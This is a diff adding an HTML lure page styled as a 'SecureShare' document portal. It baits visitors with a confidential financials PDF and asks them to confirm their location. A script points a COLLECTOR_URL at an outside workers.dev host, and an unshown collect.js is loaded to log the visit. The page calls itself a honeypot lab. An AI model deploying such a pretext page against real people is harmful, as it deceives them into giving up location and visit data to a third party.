@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Secure Document Portal</title>
+  <script>window.COLLECTOR_URL="https://4ass-bobwork.jacklafurya.workers.dev/log";</script>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <main class="card">
+    <div class="brand">
+      <div class="logo"></div>
+      <span>SecureShare</span>
+    </div>
+
+    <section id="gate">
+      <h1>A document has been shared with you</h1>
+      <p class="muted">
+        For security, confirm your location to unlock
+        <strong>Q3_Financials_CONFIDENTIAL.pdf</strong>.
+      </p>
+      <button id="verify" class="btn">Verify &amp; open document</button>
+      <p class="fine">This is a honeypot lab. No document exists.</p>
+    </section>
+
+    <section id="content" class="hidden">
+      <h1>Verification complete</h1>
+      <p class="muted">In a real trap the victim would now see a decoy PDF.
+        Everything about this visit has been logged to the collector.</p>
+    </section>
+  </main>
+
+  <script src="collect.js"></script>
+</body>
+</html>
